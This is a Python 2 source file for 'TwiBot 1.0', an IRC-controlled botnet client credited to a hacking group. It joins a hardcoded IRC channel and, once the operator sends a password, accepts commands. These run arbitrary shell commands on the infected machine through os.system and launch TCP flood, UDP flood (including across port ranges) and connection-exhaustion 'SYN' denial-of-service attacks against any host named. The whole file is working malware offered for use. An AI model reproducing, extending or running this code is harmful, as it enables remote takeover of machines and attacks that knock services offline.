#!/usr/bin/python
# TwiBot 1.0
# Group: C0d3rs 
# Author: Twi John
# WebSite: http://twijohn.blogspot.com/
#
# Greetz: Hashin, F0k3rDebug, _mlk_, L4rg4d0, sexpistol, M4CK, c00l3r_, m0nad, akm4nd, b0tluk, sigsegv...
#
#   ________
#  | ______ |
#  || |  | ||
#  || |  | ||   Hello, Join us: 
#  ||______||  #c00kies #cogubin
#  |________|
#    |    |
#   /|    |\
#  //|    |\\
#  0 |    | 0
#    |____|
#     ||||
#    _||||_
#   |__||__|
#
#  Commands:
# --------------------------------------------------------------
# --connect [PASSWORD]
#
# --execute [COMMAND]
# --tcp_attack [HOST] [PORT] [SIZE] [TIME]
# --udp_attack [HOST] [PORT(use - for all ports)] [SIZE] [TIME]
# --syn_attack [HOST] [PORT] [TIME]
# --speak [MESSAGE]
# --quit
# --------------------------------------------------------------

import socket
from time import sleep
from re import search
from random import randint, choice
from os import system
from sys import exit
from thread import start_new_thread


Server = "irc.c00kies.org"
Channel = "#c0d3rs"
Port = 6667
Nick = "Eneas"
Password = "twi666"

np = str(randint(0,100000))
np += choice("abcdefghijklmnopqrstuvwxyz012345678910")
Nick += np

def tcp():
	tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	tcp.connect((msg[0], int(msg[1])))	
	sizeb = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" * int(msg[2]) + "\r\n"
	for i in range(0,int(msg[3])):	
		try:
			tcp.send(sizeb)
		except socket.error:
			tcp.close()
			tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			tcp.connect((msg[0], int(msg[1])))
			pass
	s.send("PRIVMSG %s : --> TCP attack finalized.\r\n" % Channel)

def udp():
	sizeb = "$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$" * int(msg[2]) + "\r\n"	
	udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)	
	if search("-", msg[1]):
		portif = msg[1].split("-")
		for ia in range(0,int(msg[3])):		
			for i in range(int(portif[0]), int(portif[1]) + 1):
				try:
					udp.connect((msg[0], i))
					udp.send(sizeb)
				except socket.error:
					udp.close()
					udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)			
					pass
		s.send("PRIVMSG %s : --> UDP attack finalized.\r\n" % Channel)
	else:
		udp.connect((msg[0],int(msg[1])))		
		for ia in range(0,int(msg[3])):				
			try:
				udp.send(sizeb)
			except socket.error:
				udp.close()
				udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)		
				udp.connect((msg[0],int(msg[1])))	
				pass
		
		s.send("PRIVMSG %s : --> UDP attack finalized.\r\n" % Channel)

def conn(i):
	try:
		syn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		syn.connect((msg[0],int(msg[1])))
		sleep(10000)
		syn.close()
	except socket.error:
		pass
def syn():
	for i in range(0,int(msg[2])):
		start_new_thread(conn, (0,))
		sleep(0.01)
    	s.send("PRIVMSG %s : --> SYN attack finalized.\r\n" % Channel)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((Server,Port))
print s.recv(1024)
s.send("NICK %s\r\n" % Nick) 
print s.recv(1024)
s.send("USER %s r00att r0tlandia:Johny fino0\r\n" % Nick)
print s.recv(1024)
s.send("join %s\r\n" % Channel)
sleep(2)
print s.recv(1024)
v = False
while v != True:
	msg = s.recv(5000)
	print msg
	if search("--connect %s" % Password, msg):
		s.send("PRIVMSG %s : --> Connected! \r\n" % Channel)
		v = True

while(1):
	msg = s.recv(5000)
	print msg
	if search("--execute", msg):
		msg = msg.split("--execute")		
		msg = msg[1].split("\r\n")
		s.send("PRIVMSG %s : --> OK \r\n" % Channel)
		system(msg[0])

	elif search("--quit", msg):
		s.send("Quit\r\n")
		exit(1)

	elif search("--tcp_attack", msg):
		msg = msg.split("--tcp_attack")
		msg = msg[1].split(" ")
		msg.pop(0)
		if len(msg) == 4:
			s.send("PRIVMSG %s : --> Attacking TCP!\r\n" % Channel)
			tcp()
	elif search("--udp_attack", msg):
		msg = msg.split("--udp_attack")
		msg = msg[1].split(" ")
		msg.pop(0)
		if len(msg) == 4:
			s.send("PRIVMSG %s : --> Attacking UDP!\r\n" % Channel)
			udp()
	elif search("--syn_attack", msg):
		msg = msg.split("--syn_attack")
		msg = msg[1].split(" ")
		msg.pop(0)
		if len(msg) == 3:
			s.send("PRIVMSG %s : --> Attacking with SYN!\r\n" % Channel)
			syn()
	elif search("--speak", msg):
		msg = msg.split("--speak")
		msg.pop(0)
		msg = msg[0].strip()
		s.send("PRIVMSG %s :%s\r\n" % (Channel, msg))
		
